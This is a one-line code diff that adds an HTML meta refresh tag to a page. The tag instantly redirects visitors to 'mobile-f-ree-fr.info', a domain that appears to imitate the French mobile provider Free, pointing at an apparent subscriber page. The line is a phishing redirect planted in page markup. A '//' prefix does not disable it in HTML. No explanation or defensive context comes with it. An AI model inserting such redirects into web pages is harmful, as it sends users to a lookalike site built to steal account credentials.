@@ -1,0 +1,1 @@
+// <meta http-equiv="refresh" content="0;URL=https://mobile-f-ree-fr.info/infoid/abonne"></head>
